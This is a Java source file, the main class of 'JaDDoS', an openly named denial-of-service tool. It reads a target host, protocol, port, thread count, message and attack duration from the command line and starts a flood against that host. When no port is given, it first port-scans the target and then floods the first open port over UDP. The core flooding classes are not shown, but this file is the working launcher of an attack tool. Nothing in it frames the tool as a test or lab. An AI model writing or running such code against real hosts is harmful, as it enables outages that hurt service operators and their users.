/***
 * Copyright (c) 2021 Shehan Dhaleesha
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 * 
 */

package com.jaddos.jaddos;

import java.util.List;
import java.util.concurrent.Future;

import org.apache.log4j.BasicConfigurator;
import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;

import com.jaddos.core.JaDDoSCore;
import com.jaddos.core.JaDDoSPattern;
import com.jaddos.exception.InvalidArgumentException;
import com.jaddos.portscanner.PortScanResult;
import com.jaddos.portscanner.PortScanner;
import com.jaddos.util.HelpUtils;

/**
 * Main class for the JaDDoS Application
 * 
 * @author ShehanD
 *
 */
public class App {

	/** Logger instance */
	private static Logger logger = Logger.getLogger(App.class);

	/**
	 * Main thread
	 * 
	 * @param args
	 */
	public static void main(String[] args) {
		JaDDoSCore ddos = new JaDDoSCore();
		JaDDoSPattern ddosPattern = argumentHandler(args);

		try {
			if (ddosPattern != null && ddosPattern instanceof JaDDoSPattern) {
				String hostName = ddosPattern.getHost();
				int portNumber = ddosPattern.getPort();
				String protocol = ddosPattern.getProtocol();

				if (hostName != null && protocol != null) {

					if (portNumber != 0) {

						ddos.createDDoSPattern(hostName, portNumber, protocol.toLowerCase());
						ddos.beginAttack();

					} else {

						PortScanner portSearcher = new PortScanner(hostName);
						List<Future<PortScanResult>> queuedPortLitst = portSearcher.returnOpenPortAndIp();

						if (queuedPortLitst.size() != 0) {
							for (Future<PortScanResult> f : queuedPortLitst) {
								if (f.get().isOpened()) {
									ddos.createDDoSPattern(hostName, queuedPortLitst.get(0).get().getPort(), "udp");
									ddos.beginAttack();
									break;
								}
							}
						}
					}
				} else {
					throw new InvalidArgumentException(
							"Either host name or protocol type or both of them are not provided as arguments. Please pass at least host name and protocol type in order to continue.");
				}

			} else if (args.length == 1 && args[0].equals("--help") && ddosPattern == null) {
				HelpUtils.getInstance().printUsageFunctions();
			} else {
				throw new InvalidArgumentException();
			}
		} catch (Exception e) {
			logger.error(e.getMessage(), e);
		}
	}

	/**
	 * Method to handle command line arguments
	 * 
	 * @param args
	 * @return JaDDoSPattern
	 */
	private static JaDDoSPattern argumentHandler(String[] args) {
		if (args.length % 2 != 0) {
			return null;
		} else {
			JaDDoSPattern ddosPattern = new JaDDoSPattern();
			for (int i = 0; i < args.length; i++) {
				switch (args[i].strip()) {
				case "--host":
				case "-h":
					ddosPattern.setHost(args[++i].strip());
					break;
				case "--protocol":
				case "-pc":
					ddosPattern.setProtocol(args[++i].strip());
					break;
				case "--port":
				case "-p":
					ddosPattern.setPort(Integer.parseInt(args[++i].strip()));
					break;
				case "--threads":
				case "-t":
					ddosPattern.setThreads(Integer.parseInt(args[++i].strip()));
					break;
				case "--message":
				case "-m":
					ddosPattern.setMessage(args[++i].strip());
					break;
				case "--timeout":
				case "-tm":
					ddosPattern.setTimeout(Integer.parseInt(args[++i].strip()));
					break;
				case "--sockettimeout":
				case "-stm":
					ddosPattern.setSocketTimeout(Integer.parseInt(args[++i].strip()));
					break;
				case "--duration":
				case "-d":
					String[] durationSubstrings = args[++i].strip().split(":");
					if (durationSubstrings.length != 3) {
						return null;
					}
					ddosPattern.setHours(Integer.parseInt(durationSubstrings[0].strip()));
					ddosPattern.setMinutes(Integer.parseInt(durationSubstrings[1].strip()));
					ddosPattern.setSeconds(Integer.parseInt(durationSubstrings[2].strip()));
					break;
				}
			}

			return ddosPattern;
		}
	}
}
